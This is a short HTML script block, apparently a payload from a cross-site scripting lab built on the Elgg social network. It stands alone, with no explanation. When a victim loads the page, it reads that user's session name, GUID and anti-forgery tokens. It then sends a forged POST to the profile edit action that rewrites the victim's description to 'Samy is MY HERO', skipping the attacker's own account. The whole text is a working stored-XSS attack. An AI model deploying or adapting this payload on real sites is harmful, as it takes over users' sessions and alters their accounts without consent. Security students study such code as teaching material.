<script type="text/javascript">
window.onload=function(){
	var userName=elgg.session.user.name
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var desc="&description=Samy+is+MY+HERO"+"&accesslevel%5Bdescription%5D=2";
	var name="&name="+userName;
	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=token+ts+name+desc+guid;
	var aliceGuid=44;
	if(elgg.session.user.guid!=aliceGuid) {
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true)
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>